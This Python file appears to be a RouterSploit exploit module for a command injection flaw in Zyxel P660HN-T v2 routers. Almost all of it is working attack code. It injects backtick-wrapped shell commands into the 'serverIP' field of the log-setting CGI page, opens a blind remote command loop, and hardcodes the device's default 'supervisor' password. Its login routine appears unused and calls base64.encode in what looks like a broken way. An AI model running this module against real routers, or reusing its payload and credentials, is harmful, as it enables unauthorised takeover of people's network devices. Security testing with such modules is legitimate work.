import base64
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Zyxel P660HN-T v2 RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T V2 devices. "
                       "If the target is vulnerable it allows to execute commands on operating system level.",
        "authors": (
            "Pedro Ribeiro <pedrib[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://seclists.org/fulldisclosure/2017/Jan/40",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt",
            "https://blogs.securiteam.com/index.php/archives/2910",
        ),
        "devices": (
            "Zyxel P660HN-T v2",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString('supervisor', 'Username for the web interface')
    password = OptString('zyad1234', 'Password for the web interface')

    def __init__(self):
        self.session = None

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available. Command length up to 28 characters.")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target seems to be not vulnerable")

    def execute(self, cmd):
        payload = "1.1.1.1`{}`&#".format(cmd)
        data = {
            "logSetting_H": "1",
            "active": "1",
            "logMode": "LocalAndRemote",
            "serverPort": "123",
            "serverIP": payload
        }

        self.http_request(
            method="POST",
            path="/cgi-bin/pages/maintenance/logSetting/logSet.asp",
            data=data,
            session=self.session
        )

        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/js/Multi_Language.js"
        )

        if response is None:
            return False

        if "P-660HN-T1A_IPv6" in response.text:
            return True

        return False

    def login(self):
        credentials = base64.encode("{}:{}".format(self.username, self.password))
        path = "/cgi-bin/index.asp?" + credentials

        data = {
            "Loginuser": "supervisor",
            "Prestige_Login": "Login"
        }

        response = self.http_request(
            method="POST",
            path=path,
            data=data,
            session=self.session
        )

        if response is not None and response.status_code == 200:
            return True

        return False
